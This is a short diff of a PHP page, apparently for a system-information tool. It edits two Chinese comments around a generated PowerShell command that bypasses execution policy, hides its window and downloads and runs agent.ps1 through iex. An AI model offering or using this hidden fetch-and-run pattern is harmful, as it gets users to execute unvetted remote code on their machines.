@@ -44,13 +44,13 @@ if (!empty($id) && file_exists($file)):
 
 <?php 
 else: 
-// 自动获取 agent.ps1 地址
+// 动态获取 agent.ps1 地址（自动识别新目录 getsysinfo）
 $scheme = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? "https" : "http";
 $host = $_SERVER['HTTP_HOST'];
 $dir = rtrim(dirname($_SERVER['SCRIPT_NAME']), '/\\');
 $agent_url = "{$scheme}://{$host}{$dir}/agent.ps1";
 
-// 精简版命令
+// 极简 Win + R 执行命令
 $command = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"iex ((New-Object Net.WebClient).DownloadString('{$agent_url}'))\"";
 ?>
 <!DOCTYPE html>
